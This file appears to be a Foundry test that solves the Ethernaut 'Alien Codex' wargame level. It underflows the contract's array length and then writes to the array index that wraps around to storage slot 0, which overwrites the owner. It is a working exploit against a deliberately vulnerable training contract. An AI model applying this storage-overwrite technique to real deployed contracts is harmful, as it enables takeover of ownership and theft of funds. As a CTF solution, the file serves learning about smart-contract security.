pragma solidity ^0.8.10;

import "ds-test/test.sol";
import "../../src/Ethernaut.sol";
import "../utils/vm.sol";


interface AlienCodex {
    function make_contact() external;
    function record(bytes32 _content) external;
    function retract() external;
    function revise(uint i, bytes32 _content) external;
    function owner() external view returns (address);
}


contract AlienCodexTest is DSTest {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    Ethernaut ethernaut;

    function setUp() public {
        // Setup instance of the Ethernaut contract
        ethernaut = new Ethernaut();
    }

    function testAlienCodexHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////
        bytes memory bytecode = abi.encodePacked(vm.getCode("./src/AlienCodex/AlienCodex.json"));
        AlienCodex alienCodex;

        // level needs to be deployed this way as it only works with 0.5.0 solidity version
        assembly {
            alienCodex := create(0, add(bytecode, 0x20), mload(bytecode))
        }

        vm.startPrank(tx.origin);


        //////////////////
        // LEVEL ATTACK //
        //////////////////

        //somehow we need to write to storage slot 0
        //firstly we need to make contact
        alienCodex.make_contact();

        //with retract we can underflow the array length to uint.max
        alienCodex.retract();
        //with revise we can write into theoretically any storage slot

        //still not sure exactly why writing to this slot gives us slot 0 but oh well
        uint slot = type(uint).max - uint256(keccak256(abi.encode(uint(1)))) + 1;
        bytes32 data = bytes32(abi.encode(tx.origin));
        alienCodex.revise(slot, data);
        
        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////

        // data is of type bytes32 so the address is padded, byte manipulation to get address
        address refinedData = alienCodex.owner();

        vm.stopPrank();
        assertEq(refinedData, tx.origin);
    }
}